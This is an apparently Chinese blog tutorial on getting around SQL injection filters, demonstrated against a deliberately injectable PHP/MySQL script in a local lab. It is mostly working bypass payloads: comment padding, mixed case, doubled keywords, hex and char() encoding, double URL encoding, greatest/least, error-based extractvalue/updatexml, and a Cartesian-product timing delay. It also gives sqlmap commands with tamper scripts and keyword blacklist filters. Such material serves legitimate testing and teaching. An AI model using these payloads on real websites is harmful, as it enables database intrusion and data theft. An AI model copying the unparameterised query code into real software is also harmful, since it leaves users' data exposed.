**目录**

[过滤了空格](#t0 "过滤了空格")

[注释符/\*\*/绕过](#t1 "注释符/**/绕过")

[内联注释绕过](#t2 "内联注释绕过 ") 

[区分大小写过滤了SQL关键词](#t3 "区分大小写过滤了SQL关键词")

[大小写绕过](#t4 "大小写绕过")

[不区分大小写过滤了SQL关键词](#t5 "不区分大小写过滤了SQL关键词")

[双拼绕过](#t6 "双拼绕过")

[爆破SQL词查看是否有关键词漏过滤了](#t7 "爆破SQL词查看是否有关键词漏过滤了")

[等价函数绕过](#t8 "等价函数绕过")

[过滤了引号](#t9 "过滤了引号")

[16进制编码绕过](#t10 "16进制编码绕过")

[ASCII编码绕过](#t11 "ASCII编码绕过")

[URL编码绕过(有条件)](#t12 "URL编码绕过(有条件)")

[过滤了逗号](#t13 "过滤了逗号")

[过滤了比较符<  >](#t14 "过滤了比较符<  >")

[过滤了 or and xor not](#t15 "过滤了 or and xor not")

[过滤了注释符 #](#t16 "过滤了注释符 #")

[过滤了=](#t17 "过滤了= ") 

[过滤了延时函数](#t18 "过滤了延时函数")

* * *

![](https://img-blog.csdnimg.cn/20200301212509177.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

>  以下测试环境为：MySQL 5.7.26      PHP 5.2.17

在实际的项目开发中，程序猿一般都会使用函数过滤一些字符，以达到防止SQL注入。譬如，下面的php代码使用 preg\_replace函数过滤了一些字符

**preg\_replace('A' , 'B' , C)**  ：执行一个正则表达式的搜索和替换，这个的意思是搜索C中符合A的部分，然后用B来代替。

有关这个函数更多的详情：[preg\_replace函数详解](http://www.runoob.com/php/php-preg_replace.html "preg_replace函数详解")

![](https://img-blog.csdn.net/20180824085908682?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

过滤了字符我们就注入不了了吗？no ，所谓道高一尺魔高一丈，虽然过滤了某些字符，但是我们还是可以绕过过滤，达到SQL注入的目的。

注意：在使用注释符 # 的时候，在URL输入栏中应该输入#的URL表达式  %23 ，而不是直接输入#

有如下存在SQL注入的代码，没有任何的安全防护措施。blacklist中是过滤的手段，目前没有任何过滤。在接下来的测试过滤绕过中，我将会改变blacklist函数中的过滤语句。

```
<?php      
$con = mysql_connect("localhost","root","root");  #数据库连接      
$select_db = mysql_select_db('security');      
if (!$select_db) {      
    die("不能连接到数据库！:\n" .  mysql_error());      
}      
function blacklist($id)      
{	      
	//过滤语句      1
	return $id;      1
}      1
//查询代码      1
$id=$_GET['id'];       1
echo "-------------------------------------------------------";echo "<br>";      1
echo "接受到的ID参数：",$id;      1
echo "<br>";      1
echo "-------------------------------------------------------";echo "<br>";       2
$id=blacklist($id);       2
echo "-------------------------------------------------------";echo "<br>";      2
echo "过滤后的ID参数：",$id;      2
echo "<br>";      2
echo "-------------------------------------------------------";echo "<br>";       2
$sql = "select * from users where id=$id ";      2
echo "-------------------------------------------------------";echo "<br>";      2
echo "SQL查询语句：",$sql;      3
echo "<br>";      3
echo "-------------------------------------------------------";echo "<br>";      3
$res = mysql_query($sql);      3
if (!$res) {      3
    die("could get the res:\n" . mysql_error());      3
}      3
while ($row = mysql_fetch_assoc($res)) {      3
    print_r($row);      3
}      3
mysql_close($con);   //关闭数据库连接       4
?>
```


**过滤了空格**
---------

```
function blacklist($id)      
{	      
	$id = preg_replace('/[\s]/',"",$id);       		//过滤  空格 %20       
	return $id;      
}
```


![](https://img-blog.csdnimg.cn/20200229160657366.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 注释符/\*\*/绕过

如果只过滤了空格，没有过滤 /\*  ，那么我们可以利用 /\*\*/ 来绕过空格过滤

```
http://127.0.0.1/index.php?id=1/**/order/**/by/**/1
```


![](https://img-blog.csdnimg.cn/20200229160742655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果直接使用 sqlmap 数据，会提示

![](https://img-blog.csdnimg.cn/20200229135156254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这时候我们可以使用注释绕过，在Sqlmap中，对于MySQL数据库注释绕过空格的脚本有：space2comment.py 

Sqlmap使用命令:   \--tamper=space2comment.py

```
python2 sqlmap.py -u http://127.0.0.1/index.php?id=1 --batch --dbs --tamper=space2comment.py
```


### 内联注释绕过 

当MySQL数据库版本大于等于5.55.55时，可以使用内联注释（/!\*\*/）。

```
只要SQL语句在/*! */ 之间，就等价       
/*!union*/=union         
/*!select*/=select       
/*! select * from xxx where id=1 */
```


![](https://img-blog.csdnimg.cn/20200301135854160.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

Sqlmap中关于内联注释的脚本：versionedmorekeywords.py 和  halfversionedmorekeywords.py

**区分大小写过滤了SQL关键词**
------------------

```
function blacklist($id)      
{	      
	$id = preg_replace('/[\s]/',"",$id);       		//过滤  空格 %20       
	$id = preg_replace('/or/',"",$id);       		//过滤  or        
	$id = preg_replace('/and/',"",$id);      		//过滤  and       
	$id = preg_replace('/union/',"",$id);      		//过滤  union      
	$id = preg_replace('/by/',"",$id);      		//过滤  by       
	$id = preg_replace('/select/',"",$id);          //过滤  select        
	$id = preg_replace('/from/',"",$id);      		//过滤  from      1
	$id = preg_replace('/floor/',"",$id);      		//过滤  floor      1
	$id = preg_replace('/concat/',"",$id);          //过滤  concat      1
	$id = preg_replace('/count/',"",$id);           //过滤  count      1
	$id = preg_replace('/rand/',"",$id);            //过滤  rand      1
	$id = preg_replace('/group by/',"",$id);        //过滤  group by      1
	$id = preg_replace('/substr/',"",$id);          //过滤  substr      1
	$id = preg_replace('/ascii/',"",$id);           //过滤  ascii      1
	$id = preg_replace('/mid/',"",$id);             //过滤  mid      1
	$id = preg_replace('/like/',"",$id);            //过滤  like      1
	$id = preg_replace('/sleep/',"",$id);           //过滤  sleep      2
	$id = preg_replace('/when/',"",$id);            //过滤  when      2
	$id = preg_replace('/order/',"",$id);           //过滤  order        2
	return $id;      2
}
```


由于先匹配到了or，所以把order中的or去除了 ，并且把by也给去除了

![](https://img-blog.csdnimg.cn/20200229162332875.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 大小写绕过

由于这里过滤并没有区分大小写，所以这里我们可以大小写绕过

![](https://img-blog.csdnimg.cn/20200229162401748.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

这个在 sqlmap 中是可以直接跑出来的，因为sqlmap的payload中的SQL关键字默认都是大写的。而这里只过滤了小写的。sqlmap 中也有专门的随机大小写的绕过脚本 randomcase.py ，该脚本针对所有类型数据库都可用。

**不区分大小写过滤了SQL关键词**
-------------------

对于过滤SQL关键词绕过的思路

*   第一尝试双拼绕过
*   第二看是否有关键词漏过滤了
*   第三就是使用等价函数替换

```
function blacklist($id)      
{	      
	$id = preg_replace('/[\s]/',"",$id);       		//过滤  空格 %20       
	$id = preg_replace('/or/i',"",$id);       		//过滤  or        
	$id = preg_replace('/and/i',"",$id);      		//过滤  and       
	$id = preg_replace('/union/i',"",$id);      		//过滤  union      
	$id = preg_replace('/by/i',"",$id);      		//过滤  by       
	$id = preg_replace('/select/i',"",$id);          //过滤  select        
	$id = preg_replace('/from/i',"",$id);      		//过滤  from      1
	$id = preg_replace('/floor/i',"",$id);      		//过滤  floor      1
	$id = preg_replace('/count/i',"",$id);           //过滤  count      1
	$id = preg_replace('/rand/i',"",$id);            //过滤  rand      1
	$id = preg_replace('/group by/i',"",$id);        //过滤  group by      1
	$id = preg_replace('/substr/i',"",$id);          //过滤  substr      1
	$id = preg_replace('/ascii/i',"",$id);           //过滤  ascii      1
	$id = preg_replace('/mid/i',"",$id);             //过滤  mid      1
	$id = preg_replace('/like/i',"",$id);            //过滤  like      1
	$id = preg_replace('/sleep/i',"",$id);           //过滤  sleep      1
	$id = preg_replace('/when/i',"",$id);            //过滤  when      2
	$id = preg_replace('/order/i',"",$id);           //过滤  order        2
	return $id;      2
}
```


对于不区分大小写过滤SQL关键词，无论你大小写混合都会被过滤掉。

![](https://img-blog.csdnimg.cn/20200229164416255.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 双拼绕过

可以尝试双拼绕过

![](https://img-blog.csdnimg.cn/20200301123747191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

sqlmap 中双拼绕过的脚本 nonrecursivereplacement.py，该脚本针对所有类型数据库都可用。

### 爆破SQL词查看是否有关键词漏过滤了

这种对于不区分大小写过滤了关键字，这样，我们首先需要判断过滤了哪些关键字，漏掉了哪些关键字。这个可以使用SQL关键词来进行爆破，看看哪些关键词没有被过滤，然后再看这些关键字可以利用哪些注入方式。

![](https://img-blog.csdnimg.cn/20200229172149725.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/2020022917223080.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

对于这里，只能一个一个看返回结果，看哪些关键词没有被过滤。

如果是那种只要请求包中有过滤的关键词，则会返回特殊的响应的网站，这样查看响应代码就可以一目了然的知道哪些关键词没有被过滤。

通过对过滤关键词的爆破，我们发现 extractvalue 、updatexml 和 concat 都没有被过滤。那么，我们就可以利用 ExtractValue 报错注入或者 UpdateXML 报错注入。这里的and我们可以用&&来替换，注意，在URL中，我们需要输入的是&&的URL编码：%26%26

![](https://img-blog.csdnimg.cn/20200229173929434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

extractvalue报错注入

![](https://img-blog.csdnimg.cn/20200229174622150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

updatexml报错注入

![](https://img-blog.csdnimg.cn/20200229174839829.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 等价函数绕过

例如，substr 、substring 、mid 都过滤了的话，可以考虑使用 left()；过滤了sleep 可以用 benchmark() 替换；过滤了group\_concat 可以使用 concat\_ws() 。

**过滤了引号**
---------

![](https://img-blog.csdnimg.cn/20200229200928298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200229200946788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 16进制编码绕过

   使用 16 进制绕过引号。一般会使用到引号的地方是在最后的 where 子句中，比如

```
select * from test where username='admin';       
select * from test where username="admin";
```


当引号被过滤了的话， 'admin' 或者 "admin" 就没法用了，我们可以用 admin 的16进制 0x61646d696e 代替。

```
select*from users where username=0x61646d696e;
```


![](https://img-blog.csdnimg.cn/20200229200416397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200229201013445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**注：中文无法使用16进制编码绕过。**

![](https://img-blog.csdnimg.cn/2020030111482046.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### ASCII编码绕过

admin的各个字符的ascii值为：97-100-109-105-110 。所以我们可以使用concat(char(97),char(100),char(109),char(105),char(110)) 来代替admin

![](https://img-blog.csdnimg.cn/20200301134344705.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### URL编码绕过(有条件)

针对网上说的URL编码绕过，这里有一个前提就是，后端在处理接收的参数时对该参数进行了URL解码，并且该URL解码是在过滤函数之后才可以。如下：

```
$username=$_GET['username'];      
$username=blacklist($username);   #过滤函数      
$username=urldecode($username);   #URL解码
```


当我们直接使用 "admin" 的时候，过滤函数把admin给过滤掉了

![](https://img-blog.csdnimg.cn/20200301114536933.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

于是我们可以使用 " 的URL编码的URL编码，也就是 %2522

![](https://img-blog.csdnimg.cn/20200301114727531.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/202003011145129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在Sqlmap中，对payload进行URL编码的脚本是：charencode.py(URL编码) 、chardoubleencode.py(两次URL编码)

**过滤了逗号**
---------

在使用盲注的时候，会使用到 **substr 、substring() 、mid() 、limit** 等函数。这些函数都需要用到逗号。如果只是过滤了逗号，则对于substr、substring() 和 mid() 这两个函数可以使用from  for的方式来绕过。对于limit ，可以用 offset 绕过。substr、substring、mid三个函数的功能用法均一致。

```
// substr() 逗号绕过      
select * from test where id=1 and (select ascii(substr(username,2,1)) from admin limit 1)>97;      
select * from test where id=1 and (select ascii(substr(username from 2 for 1))from admin limit 1)>97;       
// substring() 逗号绕过      
select * from test where id=1 and (select ascii(substring(username,2,1)) from admin limit 1)>97;      
select * from test where id=1 and (select ascii(substring(username from 2 for 1))from admin limit 1)>97;       
// mid() 逗号绕过      1
select * from test where id=1 and (select ascii(mid(username,2,1)) from admin limit 1)>97;      1
select * from test where id=1 and (select ascii(mid(username from 2 for 1))from admin limit 1)>97;       1
// limit 逗号绕过      1
select * from test where id=1 limit 1,2;       1
select * from test where id=1 limit 2 offset 1;
```


![](https://img-blog.csdnimg.cn/20200229202006455.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70) ![](https://img-blog.csdnimg.cn/20200229202037131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)![](https://img-blog.csdnimg.cn/20200229202113131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200229202227578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**过滤了比较符<  >**
--------------

    在使用盲注的时候，会用到二分法来比较操作符来进行操作。如果过滤了比较操作符，那么就需要使用到 greatest()和lease（）来进行绕过。greatest()返回最大值，least()返回最小值。

greatest(n1,n2,n3.....)返回输入参数的最大值；

least(n1,n2,n3....)返回输入参数的最小值

```
select * from users where id=1 and ascii(substring(database(),0,1))>64;      
select * from users where id=1 and greatest(ascii(substring(database(),0,1)),64)>64;       
select * from users where id=1 and ascii(substring(database(),0,1))<64;      
select * from users where id=1 and least(ascii(substring(database(),0,1)),64)<64;
```


![](https://img-blog.csdnimg.cn/20200229203455779.png)

![](https://img-blog.csdnimg.cn/20200229203543680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在Sqlmap中，用greatest代替大于号的脚本是：greatest.py ，该脚本只针对于MySQL。

**过滤了 or and xor not**
----------------------

and用 && 代替 ；or用 || 代替 ； xor用 | 代替 ； not用 ! 代替 ；

```
select * from users where id=1 and 1=2;      
select * from users where id=1 && 1=2；       
select * from users where id=1 or 1=2;      
select * from users where id=1 || 1=2;
```


![](https://img-blog.csdnimg.cn/20200229203643887.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200229203746640.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**过滤了注释符 #**
------------

 如果过滤了#，则可以利用 ||'  来绕过。但是这个只限于闭合后面是单引号这种情形！

没过滤之前

![](https://img-blog.csdnimg.cn/20200229205222740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

过滤之后

![](https://img-blog.csdnimg.cn/20200229205247789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

绕过之后

![](https://img-blog.csdnimg.cn/20200229205344285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

如果是数字型注入，这种方法就不奏效！

![](https://img-blog.csdnimg.cn/20200229205545323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**过滤了=** 
---------

使用 like、rlike、regexp 

*   like：就是等于的意思
*   rlike：就是里面含有这个
*   regexp：和rlike一样，里面含有即可

如果是判断是否等于，可以转换为是否大于小于，于是可以用 > < 来绕

![](https://img-blog.csdnimg.cn/20200229205951372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

在Sqlmap中，用like代替=号的脚本是：equaltolike.py ，该脚本只针对于MySQL。

过滤了延时函数
-------

过滤目标网站过滤了延时函数如Sleep()，那么我们就必须得想其他办法使其达到延时的效果。这里我们绕过的手段是让SQL语句执行大负荷查询(笛卡尔算积)，由于大负荷查询需要计算大量的数据，所以执行语句就会有延时的效果。

在MySQL数据库中，都会有一个默认的information\_schema数据库。这个数据库中的tables表是整个MySQL数据库表名的汇总。columns表是整个MySQL数据库列的汇总。所以我们就可以利用information\_schema.tables和information\_schema.columns来进行笛卡尔算积，造成大负荷查询，以至于达到延时的效果。

![](https://img-blog.csdnimg.cn/20200315200353417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

我们的Payload如下，其中columns和tables这个字段可以互换，我们也可以在B后面继续加C、D等等

```
select*from users where id=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B);
```


![](https://img-blog.csdnimg.cn/20200315200822755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200315201133187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

配合查询语句一起，如果要查询的结果为真，则会造成延时并显示数据。如果要查询的结果为假，则不会产生延时并且不会显示数据

```
select*from users where id=1 and (ascii(substr(database(),1,1))>100) and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B);
```


![](https://img-blog.csdnimg.cn/20200315201934588.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)